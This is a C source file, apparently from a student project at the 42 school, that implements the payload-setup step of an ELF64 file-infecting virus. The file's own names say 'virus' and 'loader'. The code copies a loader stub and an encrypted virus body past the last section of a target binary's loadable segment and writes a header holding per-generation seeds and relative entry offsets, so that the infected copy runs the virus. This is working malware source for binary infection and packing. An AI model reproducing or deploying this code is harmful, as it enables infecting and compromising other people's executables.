/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   setup_payload.c                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/27 01:31:31 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "errors.h"
#include "loader.h"
#include "utils.h"
#include "virus.h"

/*
**  Elf64_packer memory overview
**  ============================
**
**                          .        .
**                          |  ...   |
**              p_offset -> |========| PT_LOAD  - relative_pt_load_address
**                          |  ...   |          ^
**                          |  ...   |          |
**             sh_offset -> |--------|          |
**                      |   |  ...   |          |
**                      V   |  ...   |          |
**    offset_in_section -   |>>>>>>>>| entry    |- relative_entry_address
**                          |  ...   |          |^
**                          |--------|          ||
**                          |  ...   |          ||
**                          |  ...   |          ||
**   end_of_last_section -> |--------| -  -  -  -- -  -  -  -  -  -
**         @loader_entry -> |@@@@@@@@| |                          |
**                          |@      @| |                          |
**                          |@      @| |                          |
**                          |@@@@@@@@| V                          |
**         packed @virus -> |~~~~~~~~| - relative_virus_addresss  |
**                          |########| |                          |
**                          |########| |                          |
**                          |########| |                          |
**                          |########| V                          V
** @_start (placeholder) -> |~~~~~~~~| - virus_size               - payload_size
**                          |  ...   |
**                          |  ...   |
**                          |========|
**                          |  ...   |
**                          .        .
**
** Note that relative_virus_addresss is in the opposite direction !
*/

static void	init_constants(struct virus_header *constants, \
			const struct entry *clone_entry, uint64_t son_seed[2])
{
	const size_t		end_of_last_section = clone_entry->end_of_last_section;
	const Elf64_Off		p_offset  = clone_entry->safe_phdr->p_offset;
	const Elf64_Xword	p_memsz   = clone_entry->safe_phdr->p_memsz;
	const Elf64_Off		sh_offset = clone_entry->safe_shdr->sh_offset;
	const size_t		rel_text  = end_of_last_section - sh_offset;

	constants->seed[0]                  = son_seed[0];
	constants->seed[1]                  = son_seed[1];
	constants->relative_pt_load_address = end_of_last_section - p_offset;
	constants->pt_load_size             = p_memsz;
	constants->relative_virus_address   = (uint64_t)virus - (uint64_t)loader_entry;
	constants->relative_entry_address   = rel_text - clone_entry->offset_in_section;
	constants->virus_size               = (uint64_t)_start - (uint64_t)virus;
}

bool		setup_payload(struct safe_ptr ref, const struct entry *clone_entry, uint64_t son_seed[2])
{
	struct virus_header	constants;

	init_constants(&constants, clone_entry, son_seed);

	const size_t	payload_size = (uint64_t)_start - (uint64_t)loader_entry;
	const size_t	virus_size   = constants.virus_size;
	const size_t	payload_off  = clone_entry->end_of_last_section;
	const size_t	virus_off    = payload_off + constants.relative_virus_address;
	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;

	void	*payload_location    = safe(ref, payload_off, payload_size);
	void	*constants_location  = safe(ref, payload_off + dist_entry_header, sizeof(constants));
	void	*virus_location      = safe(ref, virus_off, virus_size);

	if (!payload_location || !constants_location || !virus_location)
		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	memcpy(payload_location, (void *)loader_entry, payload_size);
	memcpy(constants_location, &constants, sizeof(constants));
	cypher(virus_location, virus_size);

	return true;
}
